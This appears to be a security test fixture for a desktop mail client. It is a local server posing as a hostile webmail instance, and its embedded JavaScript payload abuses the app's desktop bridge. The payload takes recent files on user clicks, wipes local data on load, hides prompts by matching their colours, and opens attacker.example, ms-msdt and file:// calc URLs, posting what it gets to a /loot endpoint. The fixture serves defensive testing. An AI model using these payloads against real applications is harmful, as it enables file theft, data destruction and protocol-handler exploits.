// A local https server that plays an instance whose page uses window.bulwarkDesktop on its
// own: it asks for recent files at any click, wipes on load, reports a theme, opens links. It
// answers /api/config the way a webmail does, so the app takes it as an instance. Everything
// the page gets back is recorded in `loot`. No real server, no real data: the "recent files"
// are made by the spec in a temp folder (--bulwark-test-recent-dir).
import type { IncomingMessage, ServerResponse } from 'node:http';
import { createSecureServer, type Http2ServerRequest, type Http2ServerResponse } from 'node:http2';
import { createServer, type Server } from 'node:https';
import type { AddressInfo, Socket } from 'node:net';
import { generateCertificate } from '../../src/main/cert';

/** `wipe-finish`: the wipe, and then the finish a page gives once it has told its server. */
export type HostileMode = 'idle' | 'recent-page' | 'recent-frame' | 'wipe' | 'wipe-finish' | 'prompt' | 'open-external';

export interface HostileInstance {
  origin: string;
  mode: HostileMode;
  loot: { kind: string; body: unknown }[];
  close: () => void;
}

/** What the page runs. `d` is the bridge: the page's own, or the parent's for a frame. */
const PAYLOAD = `
(() => {
  const mode = document.documentElement.dataset.mode;
  const inFrame = window !== window.top;
  const d = inFrame ? window.parent.bulwarkDesktop : window.bulwarkDesktop;
  const send = (kind, body) => fetch('/loot?kind=' + encodeURIComponent(kind), { method: 'POST', body: JSON.stringify(body ?? null) });
  if (!d) { send('no-bridge', { inFrame }); return; }
  send('bridge', { inFrame, keys: Object.keys(d).sort() });

  if (mode === 'recent-page' || mode === 'recent-frame') {
    if (mode === 'recent-frame' && !inFrame) return;
    // The main window's page may say it isn't locked. No app lock is set up here.
    d.os.setLocked(false);
    let listed = null;
    let taken = 0;
    // Any click the user makes for any reason: opening a mail, scrolling, a button.
    window.addEventListener('click', async () => {
      if (!listed) {
        const result = await d.recentFiles.list();
        if (result.ok) {
          listed = result.files;
          send('recent-list', result.files.map((file) => ({ path: file.path, name: file.name, size: file.size })));
        } else {
          send('recent-list-refused', result);
        }
        return;
      }
      const next = listed[taken];
      if (!next) return;
      const result = await d.recentFiles.attach(next.id);
      if (result.ok) {
        taken += 1;
        send('recent-file', { path: next.path, name: result.file.name, text: new TextDecoder().decode(result.file.data.slice(0, 200)) });
      } else {
        send('recent-file-refused', result);
      }
    });
  }

  if ((mode === 'wipe' || mode === 'wipe-finish') && !inFrame) {
    // No click, no question: on load.
    const controls = d.appLock.claim();
    if (!controls) { send('wipe-no-claim', null); return; }
    controls.localWipe({ reason: 'settings', account: null }).then(
      (result) => send('wipe-done', result).finally(() => { if (mode === 'wipe-finish') controls.finishLocalWipe({ keepLocalStorage: false }); }),
      (error) => send('wipe-error', String(error)),
    );
  }

  if (mode === 'prompt' && !inFrame) {
    // The colours the shell's own questions are drawn in.
    d.theme.set({ background: '#59687c', foreground: '#59687c', dark: false });
    window.addEventListener('click', () => {
      const started = performance.now();
      d.updates.setChannel('beta').then((state) => send('prompt-answered', { channel: state.channel, ms: Math.round(performance.now() - started) }));
    }, { once: true });
  }

  if (mode === 'open-external' && !inFrame) {
    // No click.
    for (const url of ['https://attacker.example/landing', 'tel:+4990012345678', 'sms:+4990012345678?body=hi', 'xmpp:victim@attacker.example?message', 'webcal://attacker.example/feed.ics', 'file:///C:/Windows/System32/calc.exe', 'ms-msdt:/id x', 'search-ms:query=x']) d.shell.openExternal(url);
    send('open-external-called', null);
  }
})();
`;

const page = (mode: HostileMode, frame: boolean) => `<!doctype html><html data-mode="${mode}"><head><meta charset="utf-8"><title>Mail - Bulwark</title>
<style>:root{--titlebar-right-inset:140px}html,body{margin:0;height:100%;font:15px system-ui}iframe{position:absolute;left:0;top:0;width:320px;height:320px;border:0;background:#eef}</style></head>
<body>${frame ? '<p>plugin frame</p>' : `<main style="padding:340px 24px 0"><h1>Inbox</h1><p>An ordinary-looking page. <a id="mail-link" href="mailto:someone@example.org">Write to someone</a></p></main>${mode === 'recent-frame' ? '<iframe src="/frame"></iframe>' : ''}`}
<script src="/payload.js"></script></body></html>`;

/**
 * `http2`: the server speaks HTTP/2 as a mail server does, so Chromium keeps it in the network
 * state it writes to the profile (`Network Persistent State`). HTTP/1.1 stays on for anything else.
 */
export async function startHostileInstance(port: number, options: { http2?: boolean } = {}): Promise<HostileInstance> {
  const certificate = generateCertificate('localhost');
  const state: HostileInstance = { origin: '', mode: 'idle', loot: [], close: () => {} };
  const handler = (req: IncomingMessage, res: ServerResponse) => {
    const url = new URL(req.url ?? '/', 'https://localhost');
    if (url.pathname === '/api/config') {
      res.writeHead(200, { 'content-type': 'application/json' });
      res.end(JSON.stringify({ appName: 'Bulwark', jmapServerUrl: 'https://mail.attacker.example' }));
      return;
    }
    if (url.pathname === '/payload.js') {
      res.writeHead(200, { 'content-type': 'text/javascript', 'cache-control': 'no-store' });
      res.end(PAYLOAD);
      return;
    }
    if (url.pathname === '/loot') {
      const chunks: Buffer[] = [];
      req.on('data', (chunk: Buffer) => chunks.push(chunk));
      req.on('end', () => {
        let body: unknown = null;
        try {
          body = JSON.parse(Buffer.concat(chunks).toString('utf8'));
        } catch {
          // Not JSON: kept as nothing.
        }
        state.loot.push({ kind: url.searchParams.get('kind') ?? '', body });
        res.writeHead(204).end();
      });
      return;
    }
    if (url.pathname === '/frame') {
      res.writeHead(200, { 'content-type': 'text/html', 'cache-control': 'no-store' });
      res.end(page(state.mode, true));
      return;
    }
    if (url.pathname === '/' || url.pathname === '/index.html') {
      res.writeHead(200, { 'content-type': 'text/html', 'cache-control': 'no-store' });
      res.end(page(state.mode, false));
      return;
    }
    res.writeHead(404).end();
  };
  const tls = { key: certificate.keyPem, cert: certificate.certPem };
  const sockets = new Set<Socket>();
  const server: Server | ReturnType<typeof createSecureServer> = options.http2
    ? createSecureServer({ ...tls, allowHTTP1: true }, handler as unknown as (req: Http2ServerRequest, res: Http2ServerResponse) => void)
    : createServer(tls, handler);
  server.on('connection', (socket: Socket) => {
    sockets.add(socket);
    socket.once('close', () => sockets.delete(socket));
  });
  await new Promise<void>((resolve) => server.listen(port, '127.0.0.1', resolve));
  state.origin = `https://localhost:${(server.address() as AddressInfo).port}`;
  state.close = () => {
    server.close();
    for (const socket of sockets) socket.destroy();
  };
  return state;
}
